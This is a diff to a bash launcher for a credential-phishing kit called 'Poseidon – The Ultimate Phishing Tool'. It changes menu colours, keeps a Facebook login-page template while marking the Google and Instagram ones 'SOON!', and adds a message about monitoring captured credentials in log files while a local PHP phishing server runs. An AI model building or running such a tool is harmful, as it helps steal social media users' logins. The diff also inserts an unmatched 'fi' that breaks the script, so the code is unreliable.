@@ -3,7 +3,7 @@
 # Function to display the main menu
 show_menu() {
     clear
-    echo -e "\033[38;5;130m"
+    echo -e "\033[1;34m"
     cat << "EOF"
 
 ██████╗░░█████╗░░██████╗███████╗██╗██████╗░░█████╗░███╗░░██╗
@@ -15,14 +15,14 @@ show_menu() {
 EOF
     echo -e "\033[0m"
     
-    echo -e "\n\033[38;5;178mPoseidon - The Ultimate Phishing Tool\033[0m"
-    echo -e "\n\033[38;5;130mSelect a template:\033[0m"
-    echo -e "\033[38;5;130m----------------------------------\033[0m"
-    echo -e "\033[38;5;178m1. Facebook\033[0m"
-    echo -e "\033[38;5;178m2. Google\033[0m"
-    echo -e "\033[38;5;178m3. Instagram\033[0m"
-    echo -e "\033[38;5;196m0. Exit\033[0m"
-    echo -e "\033[38;5;130m----------------------------------\033[0m"
+    echo -e "\n\033[1;36mPoseidon - The Ultimate Phishing Tool\033[0m"
+    echo -e "\n\033[1;34mSelect a template:\033[0m"
+    echo -e "\033[1;34m----------------------------------\033[0m"
+    echo -e "\033[1;36m1. Facebook\033[0m"
+    echo -e "\033[1;36m2. SOON!\033[0m"
+    echo -e "\033[1;36m3. SOON!\033[0m"
+    echo -e "\033[1;31m0. Exit\033[0m"
+    echo -e "\033[1;34m----------------------------------\033[0m"
 }
 
 # Function to check dependencies
@@ -51,8 +51,12 @@ start_server() {
         exit 1
     fi
 
-    echo -e "\nPhishing page is live at: \033[38;5;130mhttp://127.0.0.1:$port\033[0m"
-    echo -e "Press \033[38;5;196mCtrl+C\033[0m to stop the server.\n"
+    echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
+    echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
+
+    # Monitor the PHP server logs for captured credentials
+    echo -e "Monitoring captured credentials...(Keep checking FBlogs)\n"
+    fi
 }
 
 # Function to stop the server
@@ -71,8 +75,8 @@ while true; do
 
     case $option in
         1) template="facebook" ;;
-        2) template="google" ;;
-        3) template="instagram" ;;
+        2) template="SOON!" ;;
+        3) template="SOON!" ;;
         0) echo -e "\nExiting Poseidon. Goodbye!\n"; stop_server; exit 0 ;;
         *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
     esac
